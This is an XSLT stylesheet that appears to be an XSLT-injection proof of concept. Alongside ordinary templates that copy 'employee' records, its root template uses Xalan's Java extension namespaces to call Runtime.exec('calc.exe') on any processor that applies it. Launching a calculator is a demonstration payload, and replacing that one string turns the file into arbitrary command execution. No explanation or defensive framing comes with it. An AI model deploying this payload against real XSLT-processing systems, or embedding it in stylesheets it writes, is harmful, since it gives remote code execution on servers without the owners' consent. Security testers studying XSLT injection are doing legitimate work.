<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:xalan="http://xml.apache.org/xalan" xmlns:java="http://xml.apache.org/xslt/java" exclude-result-prefixes="java" xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime"  xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process">


    <xsl:output method="html"/>

<xsl:template match="/">
  <xsl:variable name="rtobject" select="runtime:getRuntime()" />
  <xsl:variable name="process" select="runtime:exec($rtobject, 'calc.exe')"/>
  <xsl:variable name="waiting" select="process:waitFor($process)"/>

  <xsl:value-of select="$process" />
</xsl:template>

    <xsl:template match="@* | node()">
        <xsl:copy>
            <xsl:apply-templates select="@* | node()"/>
        </xsl:copy>
    </xsl:template>
    <xsl:template match="employee">
        <xsl:copy>
            <id>
		    <xsl:value-of select="@id"/>
            </id>
            <xsl:apply-templates/>
        </xsl:copy>
    </xsl:template>
</xsl:stylesheet>
